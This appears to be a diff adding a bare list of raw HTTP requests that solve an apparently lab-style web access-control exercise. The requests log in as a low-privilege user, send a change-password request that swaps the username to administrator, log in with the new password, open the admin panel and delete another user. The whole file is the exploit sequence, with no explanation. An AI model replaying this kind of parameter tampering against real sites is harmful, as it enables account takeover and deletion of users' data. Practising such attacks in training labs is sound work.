@@ -1,0 +1,19 @@
+POST /login HTTP/1.1
+
+csrf=8Pa9avPNXx15IG7wMEUTdJRySi9IDauJ&username=wiener&password=peter
+
+GET /my-account HTTP/1.1
+
+POST /my-account/change-password HTTP/1.1
+
+csrf=y6J3iDPJoSf8MCZOtfXNBdE5cYtyYpcR&username=administrator&new-password-1=peter&new-password-2=peter
+
+POST /login HTTP/1.1
+
+csrf=ruQpMEaxatUTbp0JI1t1GGVXiSopHAI8&username=administrator&password=peter
+
+GET /my-account HTTP/1.1
+
+GET /admin HTTP/1.1
+
+GET /admin/delete?username=carlos HTTP/1.1
